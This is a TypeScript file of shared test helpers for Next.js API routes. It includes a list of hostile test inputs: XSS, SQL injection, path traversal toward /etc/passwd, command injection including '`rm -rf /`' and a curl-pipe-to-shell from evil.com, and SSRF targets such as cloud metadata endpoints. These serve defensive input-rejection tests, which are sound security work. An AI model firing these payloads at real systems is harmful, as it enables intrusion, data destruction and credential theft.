/**
 * Shared test utilities for API route testing
 *
 * Provides common helpers for testing Next.js API routes with proper
 * mocking, request creation, and response validation.
 */

import { NextRequest } from 'next/server'

/**
 * Creates a NextRequest for testing Next.js API routes
 *
 * @param url - The URL for the request
 * @param options - Request options
 * @returns NextRequest instance
 */
export function createMockRequest(
  url: string,
  options: {
    method?: string
    headers?: Record<string, string>
    body?: any
    searchParams?: Record<string, string>
  } = {}
): NextRequest {
  const fullUrl = new URL(url, 'http://localhost')

  if (options.searchParams) {
    Object.entries(options.searchParams).forEach(([key, value]) => {
      fullUrl.searchParams.set(key, value)
    })
  }

  const requestOptions: any = {
    method: options.method || 'GET',
    headers: options.headers || {}
  }

  // Add body if provided
  if (options.body) {
    requestOptions.body =
      typeof options.body === 'string' ? options.body : JSON.stringify(options.body)
  }

  return new NextRequest(fullUrl.toString(), requestOptions)
}

/**
 * Creates a mock response for testing
 *
 * @param data - Response data
 * @param options - Response options
 * @returns Mock response object
 */
export function createMockResponse(
  data: any,
  options: {
    status?: number
    headers?: Record<string, string>
  } = {}
) {
  return {
    json: async () => data,
    status: options.status || 200,
    headers: new Map(Object.entries(options.headers || {})),
    ok: (options.status || 200) >= 200 && (options.status || 200) < 300
  }
}

/**
 * Helper to test rate limiting behavior
 *
 * @param apiRoute - The API route handler function
 * @param endpoint - The endpoint URL
 * @param requestBody - Request body for POST requests
 * @param maxRequests - Maximum allowed requests
 * @returns Promise resolving to rate limit test results
 */
export async function testRateLimit(
  apiRoute: Function,
  endpoint: string,
  requestBody: any = {},
  maxRequests = 10
) {
  const ip = '192.168.1.1'
  const requests = []

  // Make requests up to the limit
  for (let i = 0; i < maxRequests + 1; i++) {
    const request = createMockRequest(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-forwarded-for': ip
      },
      body: requestBody
    })

    requests.push(apiRoute(request))
  }

  const responses = await Promise.all(requests)

  return {
    responses,
    rateLimitedCount: responses.filter(r => r.status === 429).length,
    successCount: responses.filter(r => r.status === 200).length
  }
}

/**
 * Helper to test security headers in responses
 *
 * @param response - The response object to check
 * @param expectedHeaders - Expected security headers
 */
export function expectSecurityHeaders(
  response: any,
  expectedHeaders: Record<string, string> = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block'
  }
) {
  Object.entries(expectedHeaders).forEach(([header, value]) => {
    expect(response.headers.get(header)).toBe(value)
  })
}

/**
 * Helper to test malicious input rejection
 *
 * @param apiRoute - The API route handler
 * @param maliciousInputs - Array of malicious input samples
 * @param fieldName - The field name to test
 * @returns Promise resolving when all tests complete
 */
export async function testMaliciousInputRejection(
  apiRoute: Function,
  maliciousInputs: string[],
  fieldName = 'url'
) {
  for (const input of maliciousInputs) {
    const request = createMockRequest('/api/test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: { [fieldName]: input }
    })

    const response = await apiRoute(request)
    const data = await response.json()

    expect(response.status).toBeGreaterThanOrEqual(400)
    expect(response.status).toBeLessThan(500)
    expect(data.error).toBeDefined()
  }
}

/**
 * Common malicious inputs for security testing
 */
export const MALICIOUS_INPUTS = {
  xss: [
    '<script>alert("xss")</script>',
    'javascript:alert(1)',
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>'
  ],
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "1' UNION SELECT * FROM users--"
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    'file:///etc/passwd',
    '....//....//....//etc/passwd'
  ],
  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '`rm -rf /`',
    '$(curl evil.com/shell.sh | sh)'
  ],
  ssrf: [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/',
    'http://localhost:8080/admin',
    'http://127.0.0.1:22'
  ]
}

/**
 * Helper to test API error responses
 *
 * @param response - The response object
 * @param expectedStatus - Expected status code
 * @param errorMessagePattern - Pattern to match in error message
 */
export function expectErrorResponse(
  response: any,
  expectedStatus: number,
  errorMessagePattern?: string | RegExp
) {
  expect(response.status).toBe(expectedStatus)

  const data = response.json ? response.json() : response
  expect(data.error || data.message).toBeDefined()

  if (errorMessagePattern) {
    const errorMessage = data.error || data.message
    if (typeof errorMessagePattern === 'string') {
      expect(errorMessage).toContain(errorMessagePattern)
    } else {
      expect(errorMessage).toMatch(errorMessagePattern)
    }
  }
}

/**
 * Helper to test successful API responses
 *
 * @param response - The response object
 * @param expectedData - Expected data structure
 */
export function expectSuccessResponse(response: any, expectedData?: any) {
  expect(response.status).toBe(200)

  if (expectedData) {
    const data = response.json ? response.json() : response
    expect(data).toMatchObject(expectedData)
  }
}

/**
 * Helper to test API validation errors
 *
 * @param apiRoute - The API route handler
 * @param invalidInputs - Map of field names to invalid values
 * @returns Promise resolving when all tests complete
 */
export async function testValidationErrors(
  apiRoute: Function,
  invalidInputs: Record<string, any[]>
) {
  for (const [field, values] of Object.entries(invalidInputs)) {
    for (const value of values) {
      const request = createMockRequest('/api/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: { [field]: value }
      })

      const response = await apiRoute(request)
      expect(response.status).toBe(400)

      const data = await response.json()
      expect(data.error).toBeDefined()
    }
  }
}
